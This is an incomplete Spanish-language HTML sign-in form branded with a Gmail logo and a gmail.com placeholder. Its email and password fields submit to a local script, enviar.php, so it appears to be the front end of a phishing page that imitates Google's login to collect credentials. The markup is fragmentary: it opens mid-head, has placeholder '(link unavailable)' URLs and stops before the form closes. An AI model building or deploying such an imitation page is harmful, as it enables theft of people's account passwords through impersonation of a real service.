<!DOCTYPE html>
<html lang="es">

    <link rel="stylesheet" href="styles.css">
    <link href="(link unavailable)" rel="stylesheet">

</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="(link unavailable)" alt="Logo Gmail">
        </div>
        <form action="enviar.php" method="post">
            <h2>Iniciar sesión</h2>
            <div class="input-group">
                <label for="correo">Correo electrónico</label>
                <input type="email" id="correo" name="correo" placeholder="example@gmail.com">
                <span class="material-icons">email</span>
            </div>
            <div class="input-group">
                <label for="contraseña">Contraseña</label>
                <input type="password" id="contraseña" name="contraseña" placeholder="*********">
                <span class="material-icons">lock</span>
            </div>
            <button type="submit">Iniciar sesión</button>
            <p>¿No tienes cuenta? <a href="#">Crear cuenta</a></p>
